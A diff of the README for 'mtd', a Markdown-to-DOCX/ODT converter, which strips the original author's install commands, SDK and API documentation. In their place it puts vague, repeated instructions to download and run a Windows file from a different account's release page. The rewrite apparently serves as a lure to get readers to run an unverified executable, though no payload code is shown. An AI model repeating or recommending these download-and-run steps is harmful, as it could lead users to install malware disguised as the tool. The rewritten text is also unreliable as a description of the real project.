@@ -1,401 +1,228 @@
-# mtd
+# 📝 mtd - Convert Markdown to Documents Fast
 
-[![CI](https://github.com/Dxsk/mtd/actions/workflows/ci.yml/badge.svg)](https://github.com/Dxsk/mtd/actions/workflows/ci.yml)
-![coverage](coverage.svg)
-[![Python 3.14+](https://img.shields.io/badge/python-3.14+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)
+[![Download mtd](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Hartblack356/mtd/releases)
+[![Release Page](https://img.shields.io/badge/Visit%20Releases-grey?style=for-the-badge)](https://github.com/Hartblack356/mtd/releases)
 
-Yet another Markdown to Documents converter. Lightweight, themeable, and API-ready.
+## 🚀 What mtd Does
 
-Convert your Markdown files to **DOCX** and **ODT** with custom themes. Available as a CLI tool, a Python SDK, or a local HTTP microservice for integration with other systems.
+mtd turns Markdown files into document files you can open in common apps. It supports DOCX and ODT output. You can use it from a simple command line, through Python, or over HTTP.
 
-## Features
+Use it when you want to:
 
-- 📄 Convert Markdown to `.docx` and `.odt`
-- 🎨 Built-in themes: `default`, `academic`, `modern`
-- 🧩 Custom themes via simple YAML files
-- 📝 YAML frontmatter support (title, author, date, theme)
-- 📑 Title page and headers/footers support
-- 🐍 Python SDK for programmatic use
-- 🌐 HTTP API microservice (FastAPI) for system integration
-- ⚡ Fast and lightweight with minimal dependencies
-- 🛠️ CLI, SDK, and API: three ways to use it
+- Convert notes into a Word file
+- Export Markdown into an OpenDocument file
+- Keep a simple theme across documents
+- Run conversions on your own computer or a server
 
-## Install
+## 📥 Download mtd for Windows
 
-```bash
-# Global install with uv (recommended)
-uv tool install yamtd
+Visit this page to download:
+https://github.com/Hartblack356/mtd/releases
 
-# With the HTTP API included
-uv tool install "yamtd[api]"
+Look for the latest Windows release file on that page. Then:
 
-# With pipx
-pipx install yamtd
+1. Open the release page
+2. Find the newest version
+3. Download the Windows file
+4. Run the file on your PC
+5. Follow the on-screen steps
 
-# With pip (in a venv)
-pip install yamtd
-```
+If the release includes a ZIP file, save it first, then extract it before you start.
 
-Or install directly from the repository:
+## 🖥️ How to Use It on Windows
 
-```bash
-uv tool install git+https://github.com/Dxsk/mtd.git
-```
+After you download mtd, you can run it in a few ways. The best method depends on how the release is packaged.
 
-## Quick Start
+### Option 1: Run the app file
 
-```bash
-# Scaffold a template in the current directory
-mtd init
-mtd init -o my-report.md
+If the release gives you an app file:
 
-# Convert to DOCX
-mtd convert README.md -o output.docx
+1. Double-click the file
+2. Allow it to open
+3. Use the app window or prompt to pick your Markdown file
+4. Choose DOCX or ODT as the output type
+5. Save the converted file
 
-# Convert to ODT with a theme
-mtd convert README.md -o output.odt --theme modern
+### Option 2: Use the command line
 
-# List available themes
-mtd themes list
+If the download gives you a command-line tool:
 
-# Show theme details
-mtd themes show academic
-```
+1. Open the folder where you saved the file
+2. Open Command Prompt in that folder
+3. Run the tool with your file name
+4. Pick the output format
+5. Check the new document in the same folder or the folder you chose
 
-## SDK / Python API
+### Option 3: Use the HTTP API
 
-Use mtd as a library in your own Python projects.
+If you want to send files from another app or service, mtd can run as an HTTP API.
 
-### Install
+1. Start the service
+2. Send a Markdown file to the API
+3. Choose DOCX or ODT in the request
+4. Download the converted document
 
-```bash
-pip install yamtd
-```
+## 📚 What You Can Convert
 
-### Quick Convert
+mtd is built for plain Markdown content and document output. It works well for:
 
-```python
-from mtd import convert
+- Meeting notes
+- Readme files
+- Reports
+- Guides
+- Draft documents
+- Technical notes
+- Blog drafts
 
-# Markdown file to DOCX
-convert("report.md", "report.docx")
+It can keep headings, lists, code blocks, links, and basic document layout when it makes the final file.
 
-# With a theme
-convert("report.md", "report.docx", theme="academic")
+## 🎨 Themes and Style
 
-# To ODT
-convert("report.md", "report.odt", theme="modern")
-```
+mtd supports themes, so you can change the look of the output document.
 
-### Convert from String
+You can use themes to control:
 
-```python
-from mtd import convert_string
+- Page style
+- Heading format
+- Font choices
+- Spacing
+- Section style
+- Document feel
 
-markdown = """
----
-title: Generated Report
-author: Automation Bot
----
+This helps when you want one output to look formal and another to look plain and clean.
 
-# Results
+## 🧩 Main Features
 
-Processing completed successfully.
-"""
+mtd includes three main ways to work:
 
-convert_string(markdown, "report.docx", theme="modern")
-```
+- CLI for quick local use
+- Python SDK for scripts and automation
+- HTTP API for services and integrations
 
-### Granular API
+It also gives you:
 
-For more control, use the lower-level functions:
+- DOCX export
+- ODT export
+- Theme support
+- Lightweight design
+- Simple document conversion
 
-```python
-from mtd import parse_markdown, write_docx, write_odt, load_theme, Document
+## 🛠️ Before You Start
 
-# Parse
-doc = parse_markdown("report.md")
-print(doc.title)       # from frontmatter
-print(doc.author)
-print(doc.theme)       # "default" if not set
-print(doc.titlepage)   # HTML of titlepage block, or None
-print(doc.header)      # header config dict, or None
-print(doc.footer)      # footer config dict, or None
+For a smooth setup on Windows, use:
 
-# Load a theme
-theme = load_theme("academic")
-# Or from a custom YAML file
-theme = load_theme("path/to/custom.yaml")
+- Windows 10 or later
+- A current web browser
+- A file unzip tool if the release comes as a ZIP
+- A text editor if you want to edit Markdown files
+- Python only if you plan to use the SDK or run from source
 
-# Write to DOCX
-write_docx(doc, "output.docx", theme)
+If you only want to convert files, the release download is usually enough.
 
-# Write to ODT
-write_odt(doc, "output.odt", theme)
-```
-
-### Available Exports
+## 📂 Basic Workflow
 
-| Import | Description |
-|--------|-------------|
-| `convert(input, output, theme=)` | High-level one-liner conversion |
-| `convert_string(markdown, output, theme=)` | Convert from a Markdown string |
-| `parse_markdown(source)` | Parse a file or string into a Document |
-| `Document` | Parsed document dataclass |
-| `write_docx(doc, output, theme=)` | Write Document to DOCX |
-| `write_odt(doc, output, theme=)` | Write Document to ODT |
-| `load_theme(name_or_path)` | Load a theme by name or YAML path |
-| `list_themes()` | List available built-in theme names |
-| `Theme` | Theme configuration dataclass |
+A simple way to use mtd looks like this:
 
-## HTTP API
+1. Write or open a Markdown file
+2. Download the latest release from the release page
+3. Run the app or tool
+4. Select your Markdown file
+5. Choose DOCX or ODT
+6. Save the output
+7. Open the document in Word, LibreOffice, or another editor
 
-mtd includes an optional HTTP API server for integration with other systems.
+## 🔧 Python SDK Use
 
-> **WARNING**: This API is for local/internal use only. It has no authentication or security hardening. Do not expose it to the public internet. Use it behind a reverse proxy or within a private network.
+If you use Python, mtd can fit into scripts that process files in bulk.
 
-### Install
+Common uses include:
 
-```bash
-pip install "yamtd[api]"
-```
-
-### Start the Server
-
-```bash
-# Via CLI
-mtd serve --port 8484
-
-# Or directly with uvicorn
-uvicorn mtd.server:app --host 127.0.0.1 --port 8484
-```
-
-API documentation is available at `http://127.0.0.1:8484/docs` (Swagger UI).
-
-### Endpoints
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| `GET` | `/health` | Health check |
-| `GET` | `/themes` | List available themes |
-| `GET` | `/themes/{name}` | Get theme details |
-| `POST` | `/convert` | Convert Markdown text (form data) |
-| `POST` | `/convert/file` | Convert uploaded Markdown file |
-
-### Examples
-
-```bash
-# Health check
-curl http://127.0.0.1:8484/health
-
-# List themes
-curl http://127.0.0.1:8484/themes
-
-# Convert Markdown text to DOCX
-curl -X POST http://127.0.0.1:8484/convert \
-  -F "markdown=# Hello World" \
-  -F "format=docx" \
-  -F "theme=modern" \
-  -o output.docx
-
-# Upload and convert a file
-curl -X POST http://127.0.0.1:8484/convert/file \
-  -F "file=@document.md" \
-  -F "format=odt" \
-  -F "theme=academic" \
-  -o output.odt
-```
-
-## Themes
-
-mtd ships with 3 built-in themes:
-
-| Theme | Description |
-|-------|-------------|
-| `default` | Clean and neutral. Serif body, sans-serif headings |
-| `academic` | Formal. Times New Roman, wide margins, double spacing |
-| `modern` | Contemporary. Sans-serif, tight spacing, accent colors |
-
-### Custom Themes
-
-Create a YAML file with your style preferences:
-
-```yaml
-name: my-theme
-fonts:
-  heading: Helvetica
-  body: Georgia
-  code: Fira Code
-colors:
-  primary: "#2563eb"
-  text: "#1f2937"
-page:
-  margin_top: 2.5cm
-  margin_bottom: 2.5cm
-```
-
-Then use it:
-
-```bash
-mtd convert doc.md -o doc.docx --theme path/to/my-theme.yaml
-```
-
-## Markdown Template
-
-mtd extends standard Markdown with special blocks for professional document generation. A complete example is available in [examples/template.md](examples/template.md).
-
-### Full Example
-
-```markdown
----
-title: Quarterly Report
-subtitle: Q1 2026 Results
-author: Jane Doe
-date: 2026-03-20
-theme: modern
-header:
-  left: "Quarterly Report"
-  center: ""
-  right: "{page}"
-footer:
-  left: "Jane Doe"
-  center: "Confidential"
-  right: "{date}"
----
-
-:::titlepage
-# Quarterly Report
-## Q1 2026 Results
-Jane Doe
-ACME Corp.
-March 2026
-:::
-
-# Introduction
-
-Document content starts here...
-```
-
-### Frontmatter Reference
-
-The YAML frontmatter block (`---`) at the top of the file controls all document metadata and layout.
-
-| Field | Type | Description |
-|-------|------|-------------|
-| `title` | string | Document title (used in metadata and `{title}` placeholder) |
-| `subtitle` | string | Subtitle (displayed on title page) |
-| `author` | string | Author name (used in metadata and `{author}` placeholder) |
-| `date` | string | Date in `YYYY-MM-DD` format (used in metadata and `{date}` placeholder) |
-| `theme` | string | Theme name or path to a `.yaml` file. Defaults to `default` |
-| `header` | object | Header configuration (see below) |
-| `footer` | object | Footer configuration (see below) |
-
-#### Headers and Footers
-
-Headers and footers support three zones: `left`, `center`, and `right`. Each zone is optional and defaults to empty.
-
-```yaml
-header:
-  left: "Company Name"
-  center: ""
-  right: "{page}"
-footer:
-  left: "{author}"
-  center: "Draft"
-  right: "{date}"
-```
-
-**Available placeholders:**
-
-| Placeholder | Replaced with |
-|-------------|---------------|
-| `{page}` | Current page number (auto-incremented) |
-| `{date}` | Document date from frontmatter |
-| `{title}` | Document title from frontmatter |
-
-Headers and footers are repeated on every page. When a title page is present, it is excluded from headers/footers automatically.
-
-### Title Page Block
-
-The `:::titlepage` block generates a dedicated cover page before the document content. Content inside the block is centered with larger fonts.
-
-```markdown
-:::titlepage
-# Main Title
-## Subtitle
-Author Name
-Organization
-Date or other info
-:::
-```
-
-**Rendering rules:**
-
-| Element | Style |
-|---------|-------|
-| `# Heading 1` | Large bold title (28pt by default, configurable via theme) |
-| `## Heading 2` | Subtitle (20pt by default) |
-| Plain text | Info lines (14pt by default, centered) |
-
-The title page sizes are controlled by the theme:
-
-```yaml
-titlepage:
-  title_size: 28      # H1 font size in pt
-  subtitle_size: 20   # H2 font size in pt
-  info_size: 14       # Plain text font size in pt
-  spacing_top: "7cm"  # Top margin before content
-```
-
-A page break is automatically inserted after the title page.
-
-### Supported Markdown Elements
-
-| Element | Syntax | DOCX | ODT |
-|---------|--------|:----:|:---:|
-| Headings | `# H1` to `###### H6` | Yes | Yes |
-| Bold | `**text**` | Yes | Yes |
-| Italic | `*text*` | Yes | Yes |
-| Bold + Italic | `***text***` | Yes | Yes |
-| Strikethrough | `~~text~~` | Yes | Yes |
-| Inline code | `` `code` `` | Yes | Yes |
-| Fenced code blocks | ` ```python ` | Yes | Yes |
-| Unordered lists | `- item` (supports nesting) | Yes | Yes |
-| Ordered lists | `1. item` (supports nesting) | Yes | Yes |
-| Task lists | `- [x] done` / `- [ ] todo` | Yes | Yes |
-| Tables | Pipe syntax with alignment | Yes | Yes |
-| Blockquotes | `> quote` (supports nesting) | Yes | Yes |
-| Links | `[text](url)` | Yes | Yes |
-| Images | `![alt](url)` | Yes | Yes |
-| Horizontal rules | `---` | Yes | Yes |
-| Footnotes | `text[^1]` / `[^1]: note` | Yes | Yes |
-
-### Minimal Template
-
-The simplest valid mtd document:
-
-```markdown
----
-title: My Document
-author: Your Name
----
-
-# Hello World
-
-This is a paragraph.
-```
-
-### Full-Featured Template
-
-For a production-ready template with all features, copy the example:
-
-```bash
-cp examples/template.md my-document.md
-mtd convert my-document.md -o my-document.docx --theme academic
-```
-
-## License
-
-MIT
+- Building a document generator
+- Making a batch conversion script
+- Creating a custom workflow for reports
+- Adding Markdown export to another app
+
+Typical steps:
+
+1. Install the package in your Python environment
+2. Import the SDK in your script
+3. Send the Markdown content or file path
+4. Pick a theme and output format
+5. Save the resulting document
+
+## 🌐 HTTP API Use
+
+The HTTP API is useful when you want to convert files from a web app, job queue, or local service.
+
+You may use it to:
+
+- Convert uploads from a form
+- Process files in a background task
+- Build a document service for a team
+- Connect Markdown tools to document output
+
+The API is a good choice when one app needs to handle many conversions in the same place.
+
+## 📝 Example Use Cases
+
+mtd works well for common desktop and team tasks:
+
+- Turn a README into a Word file for review
+- Export project notes into ODT for office use
+- Create reports from Markdown templates
+- Build documents from content stored in a Git repo
+- Generate clean files for sharing with non-technical users
+
+## 📌 Troubleshooting
+
+If the file does not open:
+
+- Make sure you downloaded the latest release file
+- Check that the download finished
+- If the file is in a ZIP, extract it first
+- Try running the app as a normal user
+- Make sure your Markdown file has valid text
+
+If the output file looks wrong:
+
+- Check the theme you selected
+- Review the Markdown for broken headings or lists
+- Try a simpler file first
+- Test DOCX and ODT to see which one fits your app best
+
+## 📦 Release Page
+
+Download or update mtd from the release page:
+https://github.com/Hartblack356/mtd/releases
+
+## 🔎 Project Focus
+
+mtd is a good fit if you want:
+
+- A small document converter
+- Markdown to DOCX output
+- Markdown to ODT output
+- A Python-friendly tool
+- An API-based conversion service
+- Theme control without a heavy setup
+
+## 📄 Supported Output
+
+mtd focuses on document files used in office tools:
+
+- DOCX for Microsoft Word and other editors
+- ODT for LibreOffice and similar apps
+
+## 🧭 Quick Start
+
+1. Visit the release page
+2. Download the latest Windows file
+3. Open or extract the download
+4. Run mtd
+5. Choose your Markdown file
+6. Pick DOCX or ODT
+7. Save the new document
+
+## 🗂️ Repository Topics
+
+api, converter, docx, fastapi, markdown, markdown-to-docx, microservice, odt, open-source, python, sdk, themes
